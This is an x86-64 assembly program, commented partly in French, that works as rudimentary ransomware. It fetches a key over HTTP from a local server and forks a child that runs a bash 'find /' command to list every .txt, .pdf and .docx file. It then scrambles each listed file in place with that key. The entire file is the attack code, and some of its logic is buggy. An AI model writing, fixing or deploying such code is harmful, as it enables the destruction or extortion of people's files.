sys_read equ 0
sys_write equ 1
sys_open equ 2
sys_close equ 3
sys_nanosleep equ 35
sys_fork equ 57
sys_execve equ 59
sys_exit equ 60

stdout equ 1

section .data
    filename db 'output', 0
    newline_message db 'THERE IS A NEWLINE', 0
    newline_message_length equ $ - newline_message
    request db 'GET / HTTP/1.1', 0x0D, 0x0A, 'Host: 127.0.0.1', 0x0D, 0x0A, 0x0D, 0x0A, 0
    request_len equ $-request
    align 8
    args  dq command, arg1, arg2, 0 ; Equivalent de /bin/bash -c 'find / -type f -iregex ".*\.\(txt\|pdf\|docx\)" > output.txt 2>/dev/null'
    command   db '/bin/bash',0
    arg1  db '-c', 0
    arg2  db 'find / -type f -iregex ".*\.\(txt\|pdf\|docx\)" > output 2>/dev/null',0
    delay dq 5, 0

section .bss
    buffer resb 8
    newlineBuffer resb 8
    counter resq 8
    path_name resq 90000
    path_name2 resq 8
    content resq 8
    fileContents    resb 999999999
    fileSize        resd 4
    fileDescriptor  resd 1
    response resb 1024
    webSecretKey    resb 1
section .text
    global _start

_start:
; Socket creation
    mov     rax, 41             ; sys_socket syscall number
    mov     rdi, 2              ; AF_INET
    mov     rsi, 1              ; SOCK_STREAM
    mov     rdx, 6              ; IPPROTO_TCP
    syscall
    mov     rbx, rax            ; Save socket descriptor

    ; Prepare server address structure
    push    0x0100007F          ; Server IP (127.0.0.1) in little endian
    push    word 0x5000         ; Port 80 in network byte order
    push    word 2              ; AF_INET
    mov     rdi, rsp            ; Pointer to sockaddr structure

    ; Connect to server
    mov     rax, 42             ; sys_connect syscall number
    mov     rsi, rdi            ; sockaddr pointer
    mov     rdx, 16             ; Size of sockaddr
    mov     rdi, rbx            ; Socket descriptor
    syscall

    ; Send HTTP request
    mov     rax, 1              ; sys_write syscall number
    mov     rdi, rbx            ; Socket descriptor
    mov     rsi, request        ; Pointer to HTTP request
    mov     rdx, request_len    ; Length of HTTP request
    syscall

    ; Receive response
    mov     rax, 0              ; sys_read syscall number
    mov     rdi, rbx            ; Socket descriptor
    mov     rsi, response       ; Buffer for response
    mov     rdx, 1024           ; Size of buffer
    syscall

    mov [webSecretKey], rsi

    ; Close socket
    mov     rax, 3              ; sys_close syscall number
    mov     rdi, rbx            ; Socket descriptor
    syscall

    ; Fork a new process
    mov rax, sys_fork
    syscall

    test rax, rax
    jz child_process  ; If rax is 0, it's the child process

    mov rax, sys_nanosleep
    mov rdi, delay
    mov rsi, 0
    syscall


    ; Open the file
    mov rdi, filename
    mov rax, 2         ; syscall number for open
    mov rsi, 0         ; flags: O_RDONLY
    mov rdx, 0         ; mode: not applicable for O_RDONLY
    syscall
    mov r8, rax        ; save the file descriptor

    xor r10, r10

read_loop:
    ; Read one character from the file
    mov rdi, r8        ; file descriptor
    mov rax, 0         ; syscall number for read
    mov rsi, buffer    ; buffer to store the character
    mov rdx, 1         ; number of bytes to read
    syscall

    ; Check for end of file
    cmp rax, 0
    je  end_program

    ; Check for newline character
    cmp byte[buffer], 0ah
    je print_newline

    movzx rax, byte [buffer]   ; Zero-extend the character to 64 bits
    mov rbx, path_name         ; Address of path_name
    add [rbx + r10], rax       ; Add the character to path_name at the current position

    inc r10

    jmp read_loop


print_newline:
    
    mov rax, 2         ; syscall number for open
    mov rdi, path_name
    mov rsi, 2         ; flags: O_RDONLY
    syscall
    mov [fileDescriptor], rax  ; store file descriptor

    movzx rax, byte [buffer]   ; Zero-extend the character to 64 bits
    mov rbx, path_name         ; Address of path_name
    add [rbx + r10], rax       ; Add the character to path_name at the current position

    inc r10

    ; get file size using lseek
    mov     rax, 8          ; syscall number for lseek
    mov     rdi, [fileDescriptor] ; correct file descriptor
    xor     rsi, rsi        ; offset
    mov     rdx, 2          ; SEEK_END
    syscall

    mov     [fileSize], rax ; store file size

    ; Reset file descriptor to beginning of file for reading
    mov     rax, 8
    mov     rdi, [fileDescriptor] ; correct file descriptor
    xor     rsi, rsi        ; offset
    mov     rdx, 0          ; SEEK_SET
    syscall

    ; Read the file content
    mov     rax, 0
    mov     rdi, [fileDescriptor]
    mov     rsi, fileContents
    mov     rdx, [fileSize]
    syscall

    mov     eax, fileSize

    mov     ecx, 0         ; Counter for file contents
    mov     esi, 0         ; Counter for secret-key
    mov     edi, 0

encryptLoop:
    mov     ah, byte [webSecretKey + esi] ; on selectionne un bit de la clef secret
    cmp     ah, 0 ; on verifie si on a atteint le nul byte de la clef
    jz      resetKeyCount ; si oui on reviens au debut de la clef avec resetKeyCount
    mov     al, byte [fileContents + ecx] ; on se place sur un byte du contenu

    test    al, al ; on verifie si il est au null byte
    jz      writeToFile ; si oui on va à la fonction d'écriture
    sub     al, ah ; on xor le byte du contenu avec celui de la clef

    mov     byte [fileContents + ecx], al; on écrit le xor à la place du caractère
    inc     esi ; on incremente le compteur de byte de la clef
    inc     ecx ; demande pour les caractères du contenu
    jmp     encryptLoop; on reviens au début de la boucle

resetKeyCount:
    mov     esi,0 ; reset du compteur de clef a 0
    jmp     encryptLoop ; on retourne dans la boucle de xor

writeToFile:
    mov     rax, 8
    mov     rdi, [fileDescriptor]
    mov     rsi, 0
    mov     rdx, 0
    syscall


    mov     rax, 1
    mov     rdi, [fileDescriptor]
    mov     rsi, fileContents
    mov     rdx, [fileSize]
    syscall

    mov     rax, 3
    mov     rdi, [fileDescriptor]
    syscall
    
    clear_path_name:
    mov r10, 0            ; Reset the counter
    mov rbx, path_name    ; Address of path_name
    mov rcx, 8            ; Number of bytes in a qword
    xor rax, rax          ; Clear register for efficiency

    push r10

    clear_loop:
    mov [rbx], rax        ; Set the current byte to zero
    add rbx, 1            ; Move to the next byte
    inc r10
    cmp r10, 1000
    jb clear_loop

    pop r10

    clear_content:
    mov r10, 0            ; Reset the counter
    mov rbx, content      ; Address of content
    mov rcx, 8            ; Number of bytes in a qword
    xor rax, rax          ; Clear register for efficiency

    push r10

    clear_content_loop:
        mov [rbx], rax    ; Set the current byte to zero
        add rbx, 1        ; Move to the next byte
        inc r10
        cmp r10, 10000       ; Adjust the loop count as needed
        jb clear_content_loop

    pop r10

    jmp read_loop

end_program:
    ; Close the file
    mov rdi, r8        ; file descriptor
    mov rax, 3         ; syscall number for close
    syscall

    ; Exit the program
    mov rax, 60        ; syscall number for exit
    xor rdi, rdi       ; exit code 0
    syscall

child_process:

    mov rax, sys_execve
    lea rdi, [command]      ; Nom de la commande a executer
    lea rsi, [args]         ; argv, donc on passe l'adresse du tableau contenant toutes les options.
    xor edx, edx            ; envp à 0
    syscall
